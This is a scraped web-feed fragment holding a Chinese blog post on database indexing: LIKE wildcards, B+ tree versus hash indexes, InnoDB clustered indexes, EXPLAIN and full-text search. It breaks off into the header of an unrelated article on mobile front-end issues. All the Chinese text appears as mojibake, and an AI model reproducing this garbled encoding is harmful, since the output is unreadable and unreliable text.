#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">è®¡ç®—æœºåä¸‡ä¸ªä¸ºä»€ä¹ˆ--æ•°æ®åº“ç´¢å¼•</h2>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæ¬¢è¿æ¥åˆ°æœ€æ–°ä¸€æœŸçš„æ— é™å¤§åšå®¢ã€‚</p>
<p>çªç„¶å‘ç°è‡ªå·±å¯¹æ•°æ®åº“ç›¸å…³çš„å†…å®¹æŒæ¡ä¸å¤Ÿæ‰å®ï¼Œäºæ˜¯å°±å»å­¦ä¹ äº†ä¸€ä¸‹ï¼Œé¡ºä¾¿ä¹Ÿå°†è‡ªå·±çš„ç†è§£å†™æˆäº†ä¸€ç¯‡åšå®¢ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©</p>
</blockquote>
<h3 data-id="heading-1">æ•°æ®åº“ç´¢å¼•ï¼šç»™æ•°æ®ä»“åº“è£…ä¸ª"æ™ºèƒ½å¯¼èˆªç³»ç»Ÿ" ğŸ§­</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ èµ°è¿›ä¸€ä¸ªå åœ° 1000 å¹³æ–¹ç±³çš„è¶…çº§å›¾ä¹¦é¦† ğŸ“šï¼Œé‡Œé¢å¡æ»¡äº†å‡ åä¸‡æœ¬ä¹¦ï¼Œå´è¿ä¸ªåˆ†ç±»ç‰Œéƒ½æ²¡æœ‰ã€‚è€æ¿å¿½ç„¶å–Šä½ æ‰¾ä¸€æœ¬ã€Šæ•°æ®åº“ä»å…¥é—¨åˆ°æ”¾å¼ƒã€‹ï¼Œä½ æ˜¯ä¸æ˜¯å½“åœºæƒ³è¡¨æ¼”ä¸€ä¸ªåŸåœ°æ¶ˆå¤±æœ¯ï¼ŸğŸ˜±</p>
<p>è¿™å°±æ˜¯<strong>æ²¡æœ‰ç´¢å¼•çš„æ•°æ®åº“</strong>çš„æ—¥å¸¸ï¼æ¯æ¬¡æŸ¥è¯¢éƒ½åƒè’™çœ¼æ‰¾ä¹¦ï¼Œå…¨è¡¨æ‰«æå°±æ˜¯é‚£ä¸ªè¢«è’™ä½çœ¼ç›çš„å€’éœ‰è›‹ï¼Œåªèƒ½ä¸€æœ¬æœ¬æ‘¸è¿‡å»ã€‚è€Œä»Šå¤©æˆ‘ä»¬è¦èŠçš„ <strong>æ•°æ®åº“ç´¢å¼•</strong> ï¼Œå°±æ˜¯ç»™è¿™ä¸ªæ··ä¹±å›¾ä¹¦é¦†è£…ä¸Šçš„æ™ºèƒ½å¯¼èˆªç³»ç»Ÿ ğŸ§­ï¼Œè®©ä½ ç§’å˜å›¾ä¹¦é¦†é¦†é•¿ï¼Œæƒ³æ‰¾å“ªæœ¬ä¹¦å°±æ‰¾å“ªæœ¬ä¹¦ï¼</p>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆ"like '%å…³é”®è¯%'"ä¼šè®©ç´¢å¼•å½“åœºç½¢å·¥ï¼Ÿ</h3>
<p>å…ˆçœ‹ä¸ªçµé­‚æ‹·é—®ï¼šä¸‹é¢ä¸¤æ¡ SQLï¼Œæ€§èƒ½å¯èƒ½å·® 1000 å€ï¼ä½ çŒœå“ªä¸ªå¿«ï¼Ÿ</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- è¯­å¥ A</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> books <span class="hljs-keyword">WHERE</span> title <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'æ•°æ®åº“%'</span>;

<span class="hljs-comment">-- è¯­å¥ B</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> books <span class="hljs-keyword">WHERE</span> title <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%æ•°æ®åº“%'</span>;
</code></pre>
<p>ç­”æ¡ˆæ˜¯<strong>è¯­å¥ A å¯èƒ½å¿«åˆ°é£èµ·ï¼Œè¯­å¥ B å¯èƒ½æ…¢åˆ°æƒ³ç ¸é”®ç›˜</strong> ï¼</p>
<p>åŸå› å°±è—åœ¨é‚£ä¸ªå°å°çš„ç™¾åˆ†å·é‡Œã€‚</p>
<h4 data-id="heading-3">ğŸŒ° è’™çœ¼æ‰¾ä¹¦ç°åœºè¿˜åŸ</h4>
<p>å‡è®¾æˆ‘ä»¬ç»™ title å­—æ®µå»ºäº†ç´¢å¼•ï¼Œå°±åƒå›¾ä¹¦é¦†æŒ‰ä¹¦åé¦–å­—æ¯æ’åºçš„åˆ†ç±»æ¶ã€‚å½“ä½ æ‰§è¡Œ LIKE 'æ•°æ®åº“%' æ—¶ï¼Œç´¢å¼•ä¼šå¼€å¿ƒåœ°å¸¦ä½ ç›´å¥” "æ•°" å­—åŒºï¼Œä» "æ•°æ®åº“å…¥é—¨" æ‰¾åˆ° "æ•°æ®åº“åŸç†"ï¼Œä¸€æ°”å‘µæˆ ğŸš€ã€‚</p>
<p>ä½†å¦‚æœå†™æˆ LIKE '%æ•°æ®åº“%'ï¼Œç›¸å½“äºä½ å‘Šè¯‰å›¾ä¹¦ç®¡ç†å‘˜ï¼š"æˆ‘è¦æ‰¾æ‰€æœ‰ä¹¦åé‡ŒåŒ…å«'æ•°æ®åº“'çš„ä¹¦ï¼Œä½†æˆ‘ä¸å‘Šè¯‰ä½ å®ƒåœ¨å¼€å¤´è¿˜æ˜¯ç»“å°¾"ã€‚è¿™æ—¶å€™ç´¢å¼•ç›´æ¥æ‡µäº† ğŸ˜µï¼Œå› ä¸ºå®ƒçš„æ’åºè§„åˆ™æ˜¯æŒ‰é¦–å­—æ¯æ¥çš„ï¼Œç°åœ¨å…³é”®è¯å¯èƒ½å‡ºç°åœ¨ä»»ä½•ä½ç½®ï¼Œå°±åƒè®©ä½ åœ¨æ‰€æœ‰ä¹¦é‡Œæ‰¾ "åŒ…å«'çš„'å­—çš„ä¹¦" ä¸€æ ·â€”â€”ç´¢å¼•å®Œå…¨å¸®ä¸ä¸Šå¿™ï¼</p>
<p><strong>å…¨è¡¨æ‰«æè­¦å‘Š</strong> âš ï¸ï¼šæ•°æ®åº“åªèƒ½å¼€å¯"è’™çœ¼æ‘¸ä¹¦"æ¨¡å¼ï¼Œé€è¡Œæ£€æŸ¥æ¯æ¡è®°å½•ã€‚å¦‚æœè¡¨ä¸­æœ‰ 100 ä¸‡æ¡æ•°æ®ï¼Œå°±åƒè®©ä½ åœ¨ 100 ä¸‡æœ¬ä¹¦é‡Œä¸€æœ¬æœ¬ç¿»å¼€æ‰¾ï¼Œç”»é¢å¤ªç¾æˆ‘ä¸æ•¢çœ‹ ğŸ¥¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af55f14a116a4b07925841af1a6aff5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6ZmQ5aSnNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765814227&amp;x-signature=vbbg0wk6GxgqkD2gRB1WNG7uPFE%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-4">é¿å‘æŒ‡å—ï¼š3 ä¸ªè®©ç´¢å¼•å¤±æ•ˆçš„ç»å…¸æ“ä½œ</h4>

























<table><thead><tr><th>é”™è¯¯å†™æ³• ğŸ”´</th><th>æ­£ç¡®å§¿åŠ¿ ğŸŸ¢</th><th>æ€§èƒ½å·®è·</th></tr></thead><tbody><tr><td>LIKE '%å…³é”®è¯%'</td><td>LIKE 'å…³é”®è¯%' æˆ–ä½¿ç”¨å…¨æ–‡ç´¢å¼•</td><td>å¯èƒ½å·® 100~1000 å€</td></tr><tr><td>WHERE age + 1 = 25</td><td>WHERE age = 24</td><td>ç´¢å¼•ç›´æ¥å¤±æ•ˆ</td></tr><tr><td>WHERE SUBSTR(title, 3) = 'æ•°æ®åº“'</td><td>WHERE title LIKE '__æ•°æ®åº“%'</td><td>å‡½æ•°æ“ä½œå¯¼è‡´ç´¢å¼•å¤±æ•ˆ</td></tr></tbody></table>
<h3 data-id="heading-5">B+æ ‘ç´¢å¼• vs å“ˆå¸Œç´¢å¼•ï¼šæ–°åå­—å…¸ vs å¿«é€’æŸœ</h3>
<p>ç°åœ¨ä½ å†³å®šç»™å›¾ä¹¦é¦†è£…å¯¼èˆªç³»ç»Ÿäº†ï¼Œä½†å¸‚åœºä¸Šæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>æ–¹æ¡ˆ A</strong> ï¼šåƒã€Šæ–°åå­—å…¸ã€‹é‚£æ ·çš„ç›®å½• ğŸ“–ï¼ˆB+æ ‘ç´¢å¼•ï¼‰</li>
<li><strong>æ–¹æ¡ˆ B</strong> ï¼šåƒå¿«é€’æŸœé‚£æ ·çš„ç¼–å·ç³»ç»Ÿ ğŸ“¦ï¼ˆå“ˆå¸Œç´¢å¼•ï¼‰</li>
</ul>
<p>åˆ°åº•é€‰å“ªä¸ªï¼Ÿè¿™å¾—çœ‹ä½ å¹³æ—¶æ€ä¹ˆæ‰¾ä¹¦ï¼</p>
<h4 data-id="heading-6">ğŸ“– B+æ ‘ç´¢å¼•ï¼šæ–°åå­—å…¸çš„æ™ºæ…§</h4>
<p>ç¿»å¼€ä½ çš„æ–°åå­—å…¸ï¼Œä¼šå‘ç°å®ƒæœ‰ä¸¤ç§ç›®å½•ï¼šæ‹¼éŸ³ç´¢å¼•å’Œéƒ¨é¦–ç´¢å¼•ã€‚B+æ ‘ç´¢å¼•å°±åƒæ‹¼éŸ³ç´¢å¼•ï¼Œå®ƒæŠŠæ•°æ®æŒ‰é¡ºåºæ’å¥½ï¼Œå¹¶ä¸”åªåœ¨å¶å­èŠ‚ç‚¹å­˜å‚¨å®Œæ•´æ•°æ®ï¼Œä¸­é—´èŠ‚ç‚¹éƒ½æ˜¯"æŒ‡è·¯ç‰Œ"ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[æ ¹èŠ‚ç‚¹] --&gt;|1-100| B[ä¸­é—´èŠ‚ç‚¹]
    A --&gt;|101-200| C[ä¸­é—´èŠ‚ç‚¹]
    
    B --&gt;|1-50| D[å¶å­èŠ‚ç‚¹: 1,3,5...50]
    B --&gt;|51-100| E[å¶å­èŠ‚ç‚¹: 51,53...100]
    
    C --&gt;|101-150| F[å¶å­èŠ‚ç‚¹: 101...150]
    C --&gt;|151-200| G[å¶å­èŠ‚ç‚¹: 151...200]
    
    D --&gt;|é“¾è¡¨æŒ‡é’ˆ| E
    E --&gt;|é“¾è¡¨æŒ‡é’ˆ| F
    F --&gt;|é“¾è¡¨æŒ‡é’ˆ| G
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c4470d9e5c644a58ad6358b273413f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6ZmQ5aSnNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765814227&amp;x-signature=6fOfWkEI4yZeG6CLAhZfpaK0H9A%3D" alt="image.png" loading="lazy"/>
<strong>é€‚ç”¨åœºæ™¯</strong> ï¼š</p>
<ul>
<li>èŒƒå›´æŸ¥è¯¢ï¼ˆæ¯”å¦‚æ‰¾ "ä»·æ ¼åœ¨ 10-50 å…ƒçš„ä¹¦"ï¼‰ğŸ“Š</li>
<li>æ’åºæ“ä½œï¼ˆæ¯”å¦‚ "æŒ‰å‡ºç‰ˆæ—¥æœŸå€’åºæ’åˆ—"ï¼‰ğŸ”„</li>
<li>å‰ç¼€åŒ¹é…ï¼ˆæ¯”å¦‚ LIKE 'æ•°æ®åº“%'ï¼‰ğŸ¯</li>
</ul>
<h4 data-id="heading-7">ğŸ“¦ å“ˆå¸Œç´¢å¼•ï¼šå¿«é€’æŸœçš„æš´åŠ›ç¾å­¦</h4>
<p>å“ˆå¸Œç´¢å¼•å°±åƒå¿«é€’æŸœï¼Œæ¯ä¸ª key éƒ½é€šè¿‡å“ˆå¸Œå‡½æ•°è®¡ç®—å‡ºä¸€ä¸ªå”¯ä¸€ç¼–å·ï¼Œç›´æ¥å®šä½åˆ°å­˜å‚¨ä½ç½®ã€‚æ¯”å¦‚æŸ¥è¯¢ id=100 çš„æ•°æ®ï¼Œå“ˆå¸Œå‡½æ•°ç®—å‡ºæ¥æ˜¯ 8 å·æŸœï¼Œç›´æ¥æ‹‰å¼€ 8 å·æŸœå°±èƒ½æ‰¾åˆ°ï¼</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong> ï¼š</p>
<ul>
<li>ç­‰å€¼æŸ¥è¯¢ï¼ˆæ¯”å¦‚ WHERE id=100ï¼‰âš¡</li>
<li>é”®å€¼å¯¹æ•°æ®åº“ï¼ˆå¦‚ Redisï¼‰ğŸš€</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28c5e3b67a8741c4b9d580703ab13f31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6ZmQ5aSnNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765814227&amp;x-signature=Pk%2BnRltKlaxkySqYMv40zm4px7s%3D" alt="image.png" loading="lazy"/></p>
<p><strong>çµé­‚å¯¹æ¯”è¡¨æ ¼</strong> ğŸ‘‡</p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>B+æ ‘ç´¢å¼•</th><th>å“ˆå¸Œç´¢å¼•</th></tr></thead><tbody><tr><td>æŸ¥æ‰¾é€Ÿåº¦</td><td>O(log n) ç¨³å®š</td><td>O(1) ä½†æœ‰å“ˆå¸Œå†²çªé£é™©</td></tr><tr><td>èŒƒå›´æŸ¥è¯¢</td><td>âœ… å¤©ç”Ÿæ”¯æŒ</td><td>âŒ å®Œå…¨ä¸æ”¯æŒ</td></tr><tr><td>æ’åº</td><td>âœ… å¶å­èŠ‚ç‚¹é“¾è¡¨å¤©ç„¶æœ‰åº</td><td>âŒ æ— åºå­˜å‚¨</td></tr><tr><td>å†…å­˜å ç”¨</td><td>ä¸­ç­‰ï¼ˆå¯å­˜ç£ç›˜ï¼‰</td><td>è¾ƒé«˜ï¼ˆé€šå¸¸å†…å­˜å­˜å‚¨ï¼‰</td></tr><tr><td>ç»å…¸åº”ç”¨</td><td>MySQL InnoDB ä¸»é”®ç´¢å¼•</td><td>Redisã€Memcached é”®å€¼å­˜å‚¨</td></tr></tbody></table>
<p>MySQL InnoDB èšç°‡ç´¢å¼•ï¼šå¶å­èŠ‚ç‚¹é‡Œè—ç€å¤§ç§˜å¯†ï¼</p>
<blockquote>
<p>å¦‚æœä½ ç”¨ MySQL çš„ InnoDB å¼•æ“ï¼Œé‚£ä½ å¿…é¡»çŸ¥é“è¿™ä¸ª<strong>æƒŠå¤©å¤§ç§˜å¯†</strong> ğŸ’£ï¼š</p>
<p>å®ƒçš„ä¸»é”®ç´¢å¼•å¶å­èŠ‚ç‚¹ç›´æ¥å­˜ç€æ•´è¡Œæ•°æ®ï¼å°±åƒä½ æŸ¥æ–°åå­—å…¸æ—¶ï¼Œç¿»åˆ° "æ•°" å­—ä¸ä»…èƒ½çœ‹åˆ°æ‹¼éŸ³ï¼Œè¿˜èƒ½ç›´æ¥æŠŠæ•´é¡µå­—å…¸æ’•ä¸‹æ¥å¸¦èµ° ğŸ“„ã€‚</p>
</blockquote>
<h4 data-id="heading-8">èšç°‡ç´¢å¼• vs éèšç°‡ç´¢å¼•ï¼šå†°ç®± vs å‚¨ç‰©æŸœ</h4>
<ul>
<li><strong>èšç°‡ç´¢å¼•</strong> ï¼ˆä¸»é”®ç´¢å¼•ï¼‰ï¼šå°±åƒå®¶é‡Œçš„å†°ç®± ğŸ§Šï¼Œé—¨ï¼ˆç´¢å¼•ï¼‰æ‰“å¼€ç›´æ¥çœ‹åˆ°é£Ÿç‰©ï¼ˆæ•°æ®ï¼‰ï¼Œä¸ç”¨å†è·‘ä¸€è¶Ÿã€‚</li>
<li><strong>éèšç°‡ç´¢å¼•</strong> ï¼ˆäºŒçº§ç´¢å¼•ï¼‰ï¼šå°±åƒå‚¨ç‰©æŸœçš„æ ‡ç­¾ ğŸ·ï¸ï¼Œä¸Šé¢å†™ç€"é›¶é£Ÿåœ¨å†°ç®±ç¬¬ä¸‰å±‚"ï¼Œä½ è¿˜å¾—å†å»å†°ç®±æ‹¿ã€‚</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    subgraph èšç°‡ç´¢å¼• B+æ ‘
        A[æ ¹èŠ‚ç‚¹: ä¸»é”®èŒƒå›´ 1-1000]
        B[ä¸­é—´èŠ‚ç‚¹: 1-500]
        C[ä¸­é—´èŠ‚ç‚¹: 501-1000]
        D[å¶å­èŠ‚ç‚¹: 1-100, åŒ…å«æ•´è¡Œæ•°æ®]
        E[å¶å­èŠ‚ç‚¹: 101-200, åŒ…å«æ•´è¡Œæ•°æ®]
    end
    A --&gt; B
    A --&gt; C
    B --&gt; D
    B --&gt; E
    D --&gt; E --&gt; F[...æ›´å¤šå¶å­èŠ‚ç‚¹]
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/160a9dcbc0064816ba3dbe2cb8b65cb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg6ZmQ5aSnNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765814227&amp;x-signature=8G4oOm2f5U2TqZ8aavypp%2FnmZqc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">å®æˆ˜ï¼šå¦‚ä½•æ£€æµ‹ç´¢å¼•å¤±æ•ˆï¼Ÿ</h4>
<p>ç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªæˆ‘å‹ç®±åº•çš„<strong>ç´¢å¼•å¤±æ•ˆæ£€æµ‹ SQL</strong> ğŸ•µï¸â€â™‚ï¸ï¼Œæ‰§è¡Œå®ƒå°±èƒ½çŸ¥é“æŸ¥è¯¢æœ‰æ²¡æœ‰ç”¨åˆ°ç´¢å¼•ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">EXPLAIN
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> books
<span class="hljs-keyword">WHERE</span> title <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%æ•°æ®åº“%'</span>  <span class="hljs-comment">-- è¿™ä¸ªä¼šå¤±æ•ˆ</span>
  <span class="hljs-keyword">AND</span> price <span class="hljs-operator">&gt;</span> <span class="hljs-number">50</span>;           <span class="hljs-comment">-- è¿™ä¸ªå¯èƒ½æœ‰æ•ˆ</span>
</code></pre>
<p><strong>ç»“æœè§£è¯»</strong> ğŸ‘‡ï¼š
-- é‡ç‚¹çœ‹ type åˆ—ï¼š
-- âœ… ref/range/indexï¼šç´¢å¼•æœ‰ç”¨
-- âŒ ALLï¼šå…¨è¡¨æ‰«æï¼Œç´¢å¼•å¤±æ•ˆï¼</p>
<p><strong>é¿å‘ç¥æŠ€</strong> âœ¨ï¼šå¦‚æœå¿…é¡»ç”¨ %å…³é”®è¯% æ¨¡ç³ŠæŸ¥è¯¢ï¼Œå¯ä»¥è€ƒè™‘ç”¨  <strong>å…¨æ–‡ç´¢å¼•</strong> ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºå…¨æ–‡ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> FULLTEXT INDEX idx_title_ft <span class="hljs-keyword">ON</span> books(title);

<span class="hljs-comment">-- é«˜æ•ˆæŸ¥è¯¢åŒ…å«å…³é”®è¯çš„è®°å½•</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> books
<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(title) AGAINST(<span class="hljs-string">'æ•°æ®åº“'</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NATURAL</span> <span class="hljs-keyword">LANGUAGE</span> MODE);
</code></pre>
<hr/>
<blockquote>
<h3 data-id="heading-10">ç´¢å¼•è®¾è®¡çš„ä¸‰å¤§çµé­‚æ‹·é—®</h3>
<ol>
<li><strong>æ˜¯ä¸æ˜¯ç´¢å¼•è¶Šå¤šè¶Šå¥½ï¼Ÿ</strong></li>
</ol>
<p>ç­”ï¼šNOï¼ç´¢å¼•åƒå›¾ä¹¦é¦†çš„åˆ†ç±»æ¶ï¼Œå¤ªå¤šäº†åè€Œéš¾æ‰¾ï¼Œè€Œä¸”æ¯æ¬¡å¢åˆ æ”¹æ•°æ®éƒ½è¦ç»´æŠ¤ç´¢å¼•ï¼Œå°±åƒæ¯æ¬¡æ–°ä¹¦å…¥åº“éƒ½è¦é‡æ–°è´´æ ‡ç­¾ è´´åˆ°å´©æºƒã€‚</p>
<ol start="2">
<li><strong>ä¸»é”®ä¸ºä»€ä¹ˆæœ€å¥½æ˜¯è‡ªå¢ IDï¼Ÿ</strong></li>
</ol>
<p>ç­”ï¼šInnoDB èšç°‡ç´¢å¼•å¦‚æœç”¨éšæœº IDï¼Œä¼šå¯¼è‡´å¶å­èŠ‚ç‚¹é¢‘ç¹åˆ†è£‚ï¼Œå°±åƒä½ æ•´ç†å¥½çš„ä¹¦æ¶å¿½ç„¶æ’è¿›æ–°ä¹¦ï¼Œæ•´ä¸ªæ¶å­éƒ½è¦é‡æ’ ğŸ—„ï¸ã€‚</p>
<ol start="3">
<li><strong>ä¸ºä»€ä¹ˆä¸å»ºè®®ç”¨ UUID åšä¸»é”®ï¼Ÿ</strong></li>
</ol>
<p>ç­”ï¼šUUID æ˜¯éšæœºå­—ç¬¦ä¸²ï¼Œç´¢å¼•æ ‘ä¼šå˜æˆ"æ­ªè„–å­æ ‘" ğŸŒ³ï¼ŒæŸ¥è¯¢æ•ˆç‡æš´è·Œï¼ä¸ä¿¡ä½ è¯•è¯•ç»™å›¾ä¹¦é¦†çš„ä¹¦æŒ‰ UUID æ’åºï¼Ÿ</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">ç»“è¯­ï¼šç´¢å¼•ä¸æ˜¯é“¶å¼¹ï¼Œä½†æ²¡æœ‰ç´¢å¼•æ˜¯çœŸçš„å®Œè›‹</h3>
<p>æœ€åé€å¤§å®¶ä¸€å¥æˆ‘å¥¶å¥¶éƒ½èƒ½å¬æ‡‚çš„è¯ï¼š<strong>ç´¢å¼•å°±åƒç»™è‡ªè¡Œè½¦è£…å˜é€Ÿå™¨</strong> ğŸš²ï¼Œå¹³æ—¶é€šå‹¤ï¼ˆç®€å•æŸ¥è¯¢ï¼‰å¯èƒ½æ„Ÿè§‰ä¸åˆ°ï¼Œä½†é‡åˆ°çˆ¬å¡ï¼ˆå¤æ‚æŸ¥è¯¢ï¼‰æ—¶ï¼Œæœ‰æ²¡æœ‰å˜é€Ÿå™¨ç›´æ¥æ˜¯ä¸¤ä¸ªç‰©ç§ï¼</p>
<p>ä½†è®°ä½ï¼Œæ²¡æœ‰ä¸‡èƒ½çš„ç´¢å¼•è®¾è®¡ï¼Œæœ€å¥½çš„å®è·µæ˜¯ï¼š<strong>ç”¨ EXPLAIN åˆ†æ SQLï¼Œç”¨ç›‘æ§å·¥å…·è§‚å¯Ÿæ…¢æŸ¥è¯¢ï¼Œè®©æ•°æ®å‘Šè¯‰ä½ ç­”æ¡ˆ</strong> ğŸ“Šã€‚</p>
<p>ç¥å¤§å®¶éƒ½èƒ½å†™å‡ºé£ä¸€èˆ¬çš„ SQLï¼Œå†ä¹Ÿä¸ç”¨å¯¹ç€å…¨è¡¨æ‰«ææ‰å¤´å‘ï¼ğŸ’‡â€â™‚ï¸ğŸ’¨</p>
<p>ï¼ˆå¦‚æœè§‰å¾—æœ‰ç”¨ï¼Œè®°å¾—ç‚¹èµæ”¶è—å“¦~ ğŸ‘‡ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç§»åŠ¨ç«¯è®¾å¤‡ä¸Šç¨€å¥‡å¤æ€ªçš„å‰ç«¯é—®é¢˜æ”¶é›†ï¼ˆä¸€ï¼‰]]></title>    <link>https://juejin.cn/post/7581041679190507555</link>    <guid>https://juejin.cn/post/7581041679190507555</guid>    <pubDate>2025-12-08T08:52:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581041679190507555" data-draft-id="7581041679190491171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç§»åŠ¨ç«¯è®¾å¤‡ä¸Šç¨€å¥‡å¤æ€ªçš„å‰ç«¯é—®é¢˜æ”¶é›†ï¼ˆä¸€ï¼‰"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T08:52:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç§»åŠ¨ç«¯è®¾å¤‡ä¸Šç¨€å¥‡å¤æ€ªçš„å‰ç«¯é—®é¢˜æ”¶é›†ï¼ˆä¸€ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T08:52:35.000Z" title="Mon Dec 08 2025 08:52:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    31
